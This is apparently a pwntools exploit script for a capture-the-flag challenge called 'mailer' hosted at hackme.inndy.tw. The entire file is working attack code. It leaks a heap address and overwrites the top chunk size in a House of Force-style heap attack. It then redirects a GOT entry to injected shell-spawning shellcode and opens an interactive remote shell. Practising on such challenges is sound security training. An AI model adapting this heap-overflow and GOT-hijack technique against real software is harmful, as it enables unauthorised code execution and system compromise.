from pwn import *
context.log_level = 'debug'
context(arch = 'i386')
#p = process('./mailer')
p = remote('hackme.inndy.tw',7721)
elf = ELF('./mailer')

def write(length,title,content):
	p.sendlineafter('Action: ','1')
	p.sendlineafter('Length: ',str(length))
	p.sendlineafter('Title: ',title)
	p.sendlineafter('Content: ',content)

def dump():
	p.sendlineafter('Action: ','2')


#leak heap_addr
shellcode = asm(shellcraft.sh())
write(50,'aa' + '\x00'*62 + p32(60),shellcode)
write(10,'bb','bb' + '\x00'*10 + p32(0xffffffff))
dump()
p.recvuntil('\x59\x00\x00\x00')
heap_addr = u32(p.recv(4))
log.success('heap addr : 0x%x'%heap_addr)
#gdb.attach(p,'b *'+str(0x080486B9))


topchunk_offset = 0xd0
topchunk_addr = heap_addr + topchunk_offset
#SIZE_SZ = 4
malloc_size = (elf.got['puts'] - 0x8 - 0x4 - 0x28) - topchunk_addr - 4
shellcode_addr = heap_addr + 72
#print hex(shellcode_addr)
write(malloc_size-72,'cc','cc')


#hijack printf_got --> shellcode_addr
p.sendlineafter('Action: ','1')
p.sendlineafter('Length: ','30')
p.sendlineafter('Title: ',p32(shellcode_addr)*10)


p.interactive()
